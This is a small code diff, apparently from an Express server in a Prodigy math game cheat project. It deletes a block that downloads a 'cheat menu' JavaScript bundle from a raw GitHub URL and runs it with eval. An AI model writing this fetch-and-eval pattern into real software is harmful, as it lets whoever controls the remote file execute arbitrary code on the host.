@@ -34,16 +34,6 @@ import { DOWNLOAD_LINK, VERSION } from "./constants";
 			return res.status(400).send(e.message);
 		}
 	});
-	
-	eval(
-  	  await(
-    	    await fetch(
-     	       "https://raw.githubusercontent.com/Prodigy-Hacking/ProdigyMathGameHacking/HEAD/willsCheatMenu/dist/bundle.js"
-   	    )
- 	  ).text()
-	);
-
-
 	app.get("/version", (req, res) => res.send(VERSION));
 	app.get("/download", (req, res) => res.redirect(DOWNLOAD_LINK));
 
